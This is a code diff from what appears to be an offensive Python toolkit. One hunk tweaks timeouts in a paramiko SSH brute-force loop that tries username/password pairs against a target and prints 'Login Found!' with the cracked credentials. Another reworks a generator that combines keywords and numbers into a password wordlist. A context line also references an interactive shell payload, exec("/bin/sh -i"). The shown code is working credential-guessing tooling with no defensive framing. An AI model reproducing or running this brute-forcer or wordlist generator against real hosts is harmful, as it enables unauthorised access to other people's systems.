@@ -473,11 +473,11 @@ try:
                                     client = paramiko.SSHClient()
                                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                     try:
-                                        client.connect(hostname=target, username=username, password=password, timeout=60, banner_timeout=60)
+                                        client.connect(hostname=target, username=username, password=password, timeout=100, banner_timeout=200)
                                     except paramiko.AuthenticationException:
                                         print("[\u001b[31m-\u001b[0m] " + username + '@' + target + ':' + password)
                                     except paramiko.ssh_exception.SSHException:
-                                        time.sleep(30)
+                                        time.sleep(60)
                                     else:
                                         print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + username + '@' + target + ':' + password + '\n')
                                         break
@@ -728,12 +728,9 @@ exec("/bin/sh -i");
                                 with open('generated_wordlist.txt', 'w') as file:
                                     for i in range(len(keywords)):
                                         for l in range(len(keywords)):
-                                            for n in range(1,1000):
-                                                file.write(str(keywords[i]) + '\n')
-                                                print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]))
-                                                file.write(str(keywords[i]) + str(keywords[l]) + '\n')
-                                                print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]))
-                                                
+                                            file.write(str(keywords[i]) + str(keywords[l]) + '\n')
+                                            print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]))
+                                            for n in range(1,1000):    
                                                 file.write(str(keywords[i]) + str(n) + '\n')
                                                 print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(n))
                                                 file.write(str(n) + str(keywords[i]) + '\n')
